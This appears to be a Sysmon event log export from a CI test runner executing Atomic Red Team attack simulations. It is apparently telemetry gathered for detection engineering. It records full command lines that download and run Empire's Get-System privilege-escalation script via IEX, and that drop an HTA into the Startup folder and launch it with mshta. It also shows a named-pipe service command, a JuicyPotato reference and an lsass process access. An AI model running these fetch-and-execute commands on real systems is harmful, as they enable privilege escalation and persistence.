CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:04:10 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:04:10.081
SourceProcessGUID: {f995aebf-63e5-6942-0c06-000000000e00}
SourceProcessId: 1460
SourceThreadId: 3232
SourceImage: C:\Windows\system32\compattelrunner.exe
TargetProcessGUID: {f995aebf-5f5c-6942-0d00-000000000e00}
TargetProcessId: 992
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\SYSTEM32\aeinv.dll+22b55|C:\Windows\SYSTEM32\aeinv.dll+39fa3|C:\Windows\SYSTEM32\aeinv.dll+74d22|C:\Windows\SYSTEM32\aeinv.dll+48f80|C:\Windows\SYSTEM32\aeinv.dll+53228|C:\Windows\SYSTEM32\aeinv.dll+5365c|C:\Windows\system32\compattelrunner.exe+b57e|C:\Windows\system32\compattelrunner.exe+c7fb|C:\Windows\system32\compattelrunner.exe+1f5b|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:03:55 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:03:54.738
ProcessGuid: {f995aebf-63ea-6942-1e06-000000000e00}
ProcessId: 5580
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53618
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:03:55 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:03:54.733
ProcessGuid: {f995aebf-63ea-6942-1e06-000000000e00}
ProcessId: 5580
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:54 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:03:52.885
ProcessGuid: {f995aebf-63e8-6942-1406-000000000e00}
ProcessId: 4620
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\mshta.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:54 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:54.780
ProcessGuid: {f995aebf-63e9-6942-1a06-000000000e00}
ProcessId: 3540
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:54 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:54.407
ProcessGuid: {f995aebf-63ea-6942-1e06-000000000e00}
ProcessId: 5580
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rnd41ubk.jqc.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:54 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:54.377
ProcessGuid: {f995aebf-63ea-6942-1e06-000000000e00}
ProcessId: 5580
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rnd41ubk.jqc.ps1
CreationUtcTime: 2025-12-17 08:03:54.377
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:54 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:54.369
ProcessGuid: {f995aebf-63e9-6942-1a06-000000000e00}
ProcessId: 3540
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2aujxp3h.sip.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:54 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:54.318
ProcessGuid: {f995aebf-63e9-6942-1a06-000000000e00}
ProcessId: 3540
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2aujxp3h.sip.ps1
CreationUtcTime: 2025-12-17 08:03:54.318
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:54 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:54.210
ProcessGuid: {f995aebf-63ea-6942-1e06-000000000e00}
ProcessId: 5580
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$var =Invoke-WebRequest \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\""""
$var.content|out-file \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
mshta \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
start-sleep -s 15
stop-process -name \""""calculator\"""" -Force -ErrorAction Ignore
stop-process -name \""""CalculatorApp\"""" -Force -ErrorAction Ignore}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:50 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:50.072
ProcessGuid: {f995aebf-63e5-6942-0e06-000000000e00}
ProcessId: 6004
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_uxjcxqis.sti.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:50 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:50.049
ProcessGuid: {f995aebf-63e5-6942-0e06-000000000e00}
ProcessId: 6004
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_uxjcxqis.sti.ps1
CreationUtcTime: 2025-12-17 08:03:50.049
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:49 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:49.956
ProcessGuid: {f995aebf-63e5-6942-0e06-000000000e00}
ProcessId: 6004
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {get-ciminstance Win32_Process | where-object { $_.Path -eq \""""$env:windir\system32\notepad.exe\"""" } | invoke-cimmethod -methodname \""""terminate\"""" | out-null
get-ciminstance Win32_Process | where-object { $_.Path -eq \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\JuicyPotato.exe\"""" } | invoke-cimmethod -methodname \""""terminate\"""" | out-null}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:49 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:49.558
ProcessGuid: {f995aebf-63e5-6942-0a06-000000000e00}
ProcessId: 3028
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_t4d3yoce.era.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:49 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:49.536
ProcessGuid: {f995aebf-63e5-6942-0a06-000000000e00}
ProcessId: 3028
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_t4d3yoce.era.ps1
CreationUtcTime: 2025-12-17 08:03:49.536
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:49 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:49.178
ProcessGuid: {f995aebf-63e5-6942-0806-000000000e00}
ProcessId: 8092
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ryg0qyan.uu5.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:49 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:49.159
ProcessGuid: {f995aebf-63e5-6942-0806-000000000e00}
ProcessId: 8092
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ryg0qyan.uu5.ps1
CreationUtcTime: 2025-12-17 08:03:49.159
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:48 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:48.802
ProcessGuid: {f995aebf-63e4-6942-0606-000000000e00}
ProcessId: 7796
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4ezjodci.5lc.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:48 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:48.781
ProcessGuid: {f995aebf-63e4-6942-0606-000000000e00}
ProcessId: 7796
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_4ezjodci.5lc.ps1
CreationUtcTime: 2025-12-17 08:03:48.781
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:48 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:48.431
ProcessGuid: {f995aebf-63e4-6942-0406-000000000e00}
ProcessId: 8364
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_chhiedd1.c5d.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:48 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:48.410
ProcessGuid: {f995aebf-63e4-6942-0406-000000000e00}
ProcessId: 8364
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_chhiedd1.c5d.ps1
CreationUtcTime: 2025-12-17 08:03:48.410
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:43 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:43.226
ProcessGuid: {f995aebf-63df-6942-ff05-000000000e00}
ProcessId: 8508
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_5wn2cdj0.vy0.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:43 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:43.204
ProcessGuid: {f995aebf-63df-6942-ff05-000000000e00}
ProcessId: 8508
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_5wn2cdj0.vy0.ps1
CreationUtcTime: 2025-12-17 08:03:43.204
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:22 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:22.506
ProcessGuid: {f995aebf-63ca-6942-fa05-000000000e00}
ProcessId: 3196
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kpfrgvck.g0z.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:22 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:22.487
ProcessGuid: {f995aebf-63ca-6942-fa05-000000000e00}
ProcessId: 3196
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kpfrgvck.g0z.ps1
CreationUtcTime: 2025-12-17 08:03:22.487
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:17 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:03:15.716
ProcessGuid: {f995aebf-63c3-6942-f605-000000000e00}
ProcessId: 1988
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53604
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:03:17 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:03:16.239
ProcessGuid: {f995aebf-63c3-6942-f605-000000000e00}
ProcessId: 1988
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:17 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:03:15.712
ProcessGuid: {f995aebf-63c3-6942-f605-000000000e00}
ProcessId: 1988
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:16 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:16.816
ProcessGuid: {f995aebf-63c4-6942-f805-000000000e00}
ProcessId: 1316
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kj3fw1pz.mpa.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:16 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:16.794
ProcessGuid: {f995aebf-63c4-6942-f805-000000000e00}
ProcessId: 1316
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kj3fw1pz.mpa.ps1
CreationUtcTime: 2025-12-17 08:03:16.794
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:15.488
ProcessGuid: {f995aebf-63c3-6942-f605-000000000e00}
ProcessId: 1988
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xi3yfvnf.3ao.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:15 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:15.468
ProcessGuid: {f995aebf-63c3-6942-f605-000000000e00}
ProcessId: 1988
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xi3yfvnf.3ao.ps1
CreationUtcTime: 2025-12-17 08:03:15.468
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:15 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:15.389
ProcessGuid: {f995aebf-63c3-6942-f605-000000000e00}
ProcessId: 1988
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:14 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:03:12.275
ProcessGuid: {f995aebf-63bf-6942-ee05-000000000e00}
ProcessId: 6340
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:13 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:03:12.280
ProcessGuid: {f995aebf-63bf-6942-ee05-000000000e00}
ProcessId: 6340
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53598
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:03:12 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 08:03:12.687
ProcessGuid: {f995aebf-5f5c-6942-0c00-000000000e00}
ProcessId: 972
Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\TestSVC\ImagePath
Details: %%COMSPEC%% /C start %%COMSPEC%% /C ""timeout /t 3 >nul&&echo TestSVC > \\.\pipe\TestSVC""
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:03:12 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:12.044
ProcessGuid: {f995aebf-63bf-6942-ee05-000000000e00}
ProcessId: 6340
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_opto4a2z.44y.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:12 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:12.024
ProcessGuid: {f995aebf-63bf-6942-ee05-000000000e00}
ProcessId: 6340
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_opto4a2z.44y.ps1
CreationUtcTime: 2025-12-17 08:03:12.024
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:11 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:11.943
ProcessGuid: {f995aebf-63bf-6942-ee05-000000000e00}
ProcessId: 6340
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:09 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:09.159
ProcessGuid: {f995aebf-63bd-6942-e005-000000000e00}
ProcessId: 10016
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0ckp5lbl.lxj.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
